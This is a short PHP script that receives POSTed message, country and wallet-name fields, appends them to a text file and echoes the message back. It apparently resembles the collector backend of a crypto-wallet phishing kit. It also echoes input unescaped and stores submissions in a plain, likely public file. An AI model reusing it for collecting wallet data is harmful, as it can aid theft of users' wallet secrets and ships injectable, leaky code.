<?php
// Check if the message has been sent through POST method
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["message"])) {
    // Retrieve the message, country, and wallet name from the POST data
    $message = $_POST["message"];
    $country = $_POST["country"]; // Added country parameter
    $walletName = $_POST["wallet_name"]; // Added wallet_name parameter

    // Create a formatted log entry with breaks between sections
    $logData = "Received message: " . $message . "\n";
    $logData .= "Country: " . $country . "\n";
    $logData .= "Wallet Name: " . $walletName . "\n";
    $logData .= "--------------------------------------------<br>\n\n"; // Optional separator

    // Log the received message, country, and wallet name
    file_put_contents("received_messages.txt", $logData, FILE_APPEND);

    // Prepare a response (optional)
    $response = "" . $message;

    // Echo the response back to the AJAX call
    echo $response;
} else {
    // If the message was not sent properly, return an error response
    echo "Error: Message not received.";
}
?>
